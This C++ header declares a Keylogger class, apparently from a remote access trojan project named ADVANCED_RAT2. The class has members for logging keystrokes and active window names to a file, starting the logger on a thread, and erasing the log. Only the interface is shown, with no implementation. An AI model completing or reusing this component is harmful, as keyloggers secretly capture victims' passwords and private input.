//
// Created by avita on 25/02/2021.
//



#ifndef ADVANCED_RAT2_KEYLOGGER_H
#define ADVANCED_RAT2_KEYLOGGER_H

#include <iostream>
#include <windows.h>
#include "Functions.h"
#include <string>
#include <codecvt>
#include <fstream>

using namespace std;

class Keylogger {

public:
    Functions *functions = new Functions();
    const locale utf8_locale = locale(locale(), new codecvt_utf8<wchar_t>());
    SYSTEMTIME st;
    wofstream file;
    HWND hWindowHandle;
    wstring windowName;
    BYTE *kState;
    bool run;
    DWORD threadId;
    HKL hkl;


    Keylogger();

    //Writing a unicode key to the keylogger file
    void writeKeyToFile(char key);

    //Starting the keylogger
    static int startKeylogger(Keylogger keylogger);

    //Delete all the data in the keylogger file
    bool deleteKeyloggerData();

};


#endif //ADVANCED_RAT2_KEYLOGGER_H
